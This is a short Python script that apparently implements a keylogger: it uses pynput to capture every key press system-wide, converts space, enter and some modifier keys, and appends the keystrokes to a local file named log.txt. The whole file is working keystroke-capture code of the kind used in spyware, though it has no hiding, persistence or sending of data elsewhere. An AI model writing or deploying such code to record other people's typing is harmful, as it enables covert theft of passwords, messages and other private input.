from asyncore import write
from pynput.keyboard import Listener

def writetofile(key):
    keydata = str(key)
    keydata = keydata.replace("'","")

    if keydata == 'Key.space':
        keydata = ' '
    if keydata == "Key.enter":
        keydata = "\n"
    if keydata == 'Key.shift' :
        keydata = ''
    if keydata == 'Key.ctrl_l':
        keydata = ''
    if keydata == 'Key.alt_gr':
        keydata = ''

    with open("log.txt","a") as f:
         f.write(keydata)

with Listener(on_press=writetofile) as l:
    l.join()